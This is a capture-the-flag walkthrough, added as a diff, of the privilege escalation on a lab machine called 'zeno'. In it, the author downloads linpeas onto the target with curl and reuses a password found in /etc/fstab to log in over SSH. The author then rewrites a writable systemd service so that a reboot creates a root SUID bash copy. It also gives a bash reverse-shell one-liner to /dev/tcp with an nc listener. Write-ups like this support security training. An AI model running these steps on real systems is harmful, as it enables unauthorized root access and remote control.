@@ -1,0 +1,77 @@
+
+Privilege Escalation
+
+
+I looked under all the files and folders and found /var/www/html/rms/conecction/config.php but it did not work as a password for ssh connection for edward.
+
+
+Then, the linpeas.sh file was downloaded into the /tmp folder. Since wget was not working, it was downloaded using curl.
+
+Command >> curl <http://your_ip>/linpeas.sh -o linpeas.sh
+
+
+The following result was captured:
+
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                               
+You have write privileges over /etc/systemd/system/zeno-monitoring.service                                                    
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No                                                                                  
+═╣ Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share        /mnt/secret-share       cifs    _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft       0 0                                   
+═╣ Can I read shadow files? ............. No
+═╣ Can I read shadow plists? ............ No                                                                                  
+═╣ Can I write shadow plists? ........... No                                                                                  
+═╣ Can I read opasswd file? ............. No                                                                                  
+═╣ Can I write in network-scripts? ...... No                                                                                  
+═╣ Can I read root folder? .............. No        
+
+
+password >> FrobjoodAdkoonceanJa
+
+
+
+I tried to log in to the system as Edward user via SSH and entered by giving the password and caught the user.txt flag.
+
+>> ssh edward@<server_ip> -p 22
+
+
+I ran the sudo -l command to elevate privileges and
+I saw that the (ALL) /usr/sbin/reboot command was run with sudo privileges.
+
+Priv ESc Step::
+
+linpeas found write permission >>> /etc/systemd/system/zeno-monitoring.service script. 
+
+
+
+echo -e "[unit]\nDescription=Zeno monitoring\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash_root; chmod +xs /home/edward/bash_root'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/zeno-monitoring.service
+[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service[unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash_root; chmod +xs /home/edward/bash_root'
+
+[Install]
+WantedBy=multi-user.target
+[edward@zeno ~]$ sudo /usr/sbin/reboot
+
+
+There is a code example above that will increase our privileges. You can also do this with a reverse shell. When restarting, you can listen with netcat and listen on a certain port and access root privileges.
+
+EXam >>> bash -i >& /dev/tcp/<your_ip>/9002 0>&1
+
+nc -nlvp 9002
+
+>>>>>Get SHell<<<<<<<
+
+
+When we connect via ssh again after 1-2 minutes, we see that our bash_root file is here.
+
+[edward@zeno ~]$ ./bash_root -p   >> -p represents privileged mode
+
+
+WE ARE ROOT!!!!
